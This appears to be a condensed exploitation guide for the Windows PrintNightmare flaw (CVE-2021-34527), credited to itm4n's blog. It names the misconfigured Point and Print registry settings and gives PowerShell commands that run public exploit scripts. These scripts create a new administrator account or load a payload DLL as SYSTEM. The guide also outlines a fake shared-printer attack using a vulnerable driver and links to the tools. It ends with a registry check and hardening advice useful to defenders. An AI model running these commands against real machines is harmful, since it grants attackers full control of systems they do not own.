# PrintNightmare Exploitation Guide (2024)

Source: https://itm4n.github.io/printnightmare-exploitation/

## Summary

PrintNightmare (CVE-2021-34527) exploits the Print Spooler's "Point and Print" feature. Despite Microsoft patches, misconfigured GPOs still leave machines vulnerable.

## Vulnerable Configuration

Both conditions required for the simple LPE variant:

1. **`RestrictDriverInstallationToAdministrators` = `0`** (Disabled)
   - `HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\RestrictDriverInstallationToAdministrators`
   - Allows non-admin users to install printer drivers
   
2. **`NoWarningNoElevationOnInstall` = `1`** (Disabled prompts)
   - `HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall`
   - No elevation prompt shown when installing printer drivers
   - **Disabling prompts renders all other settings useless** (approved servers, in-forest, etc.)

## Exploitation (Simple LPE)

```powershell
# John Hammond / Caleb Stewart PoC
. .\CVE-2021-34527.ps1
Invoke-Nightmare -NewUser "adm1n" -NewPassword "P@ssw0rd" -DriverName "Xerox3010"

# Or with custom DLL
Invoke-Nightmare -DLL C:\path\to\payload.dll

# itm4n's PoC
. .\PointAndPrint.ps1
Invoke-PointAndPrintExploit -DllPath "$HOME\Downloads\payload.dll"
```

The DLL path is interpreted in the context of the Print Spooler service (`LocalSystem`), so **absolute local paths** are required.

## Alternative: Package Point and Print Attack

If security prompts are enabled but `RestrictDriverInstallationToAdministrators` is disabled:

1. **Attacker**: Set up a fake shared printer using a known vulnerable driver (e.g., Lexmark Universal v2 - CVE-2021-35449)
2. **Target**: Connect to the fake printer → coerces Print Spooler to download + install the vulnerable driver
3. **Target**: Exploit the vulnerable driver (path traversal in GDL file) to load arbitrary DLL as SYSTEM

Tools:
- [Concealed Position](https://github.com/jacob-baines/concealed_position) (standalone exe)
- [itm4n's PointAndPrint.ps1](https://github.com/itm4n/PrivescCheck/releases/latest/download/PointAndPrint.ps1)

## Key Registry Check

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

# Expected values for vulnerability:
# RestrictDriverInstallationToAdministrators = 0
# NoWarningNoElevationOnInstall = 1
#
# Safe defaults (patched):
# RestrictDriverInstallationToAdministrators = 1 (or key doesn't exist)
# NoWarningNoElevationOnInstall = 0 (or key doesn't exist)
```

## Flowchart Decision

```
RestrictDriverInstallationToAdministrators = 1?
  YES → Safe (cannot install drivers without admin)
  NO  → Can users install printer drivers without elevation prompts?
          YES → VULNERABLE (simple LPE via AddPrinterDriverEx)
          NO  → Package Point & Print only?
                  YES → Need approved servers list + signed drivers
                  NO  → VULNERABLE (via vulnerable driver trick)
```

## Locking Down Safely

If printing is required, use:
- `Only use Package Point and print` → Enabled
- `Package Point and print - Approved servers` → List of trusted print servers
- Package-aware (signed) drivers only
